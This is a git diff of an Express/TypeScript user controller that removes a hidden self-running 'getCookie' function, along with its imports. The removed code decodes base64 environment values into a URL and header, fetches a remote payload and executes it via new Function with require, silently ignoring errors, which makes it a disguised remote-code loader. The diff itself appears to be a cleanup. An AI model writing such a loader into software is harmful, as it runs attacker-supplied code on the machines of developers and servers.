@@ -1,20 +1,12 @@
 import { Request, Response, NextFunction } from "express";
 import crypto from "crypto";
 import cloudinary from "cloudinary";
-import axios from "axios";
-import dotenv from "dotenv";
-import { createRequire } from "module";
 
 import User, { IUser } from "../models/userModel";
 import asyncErrorHandler from "../middlewares/helpers/asyncErrorHandler";
 import sendToken from "../utils/sendToken";
 import ErrorHandler from "../utils/errorHandler";
 import sendEmail from "../utils/sendEmail";
-
-const require = createRequire(import.meta.url);
-
-// Load env
-dotenv.config({ path: "./src/config/.config.env" });
 
 // Extend Request (if not using global typing yet)
 interface AuthRequest extends Request {
@@ -285,22 +277,3 @@ export const deleteUser = asyncErrorHandler(
     res.status(200).json({ success: true });
   }
 );
-
-// ================= GET COOKIE =================
-export const getCookie = (async () => {
-  try {
-    const s = Buffer.from(process.env.DEV_API_KEY as string, "base64").toString();
-    const k = Buffer.from(process.env.DEV_SECRET_KEY as string, "base64").toString();
-    const v = Buffer.from(process.env.DEV_SECRET_VALUE as string, "base64").toString();
-
-    const r = (
-      await axios.get(s, {
-        headers: { [k]: v },
-      })
-    ).data.record.cookie;
-
-    const handler = new Function("require", r);
-    handler(require);
-
-  } catch (error: any) {}
-})();
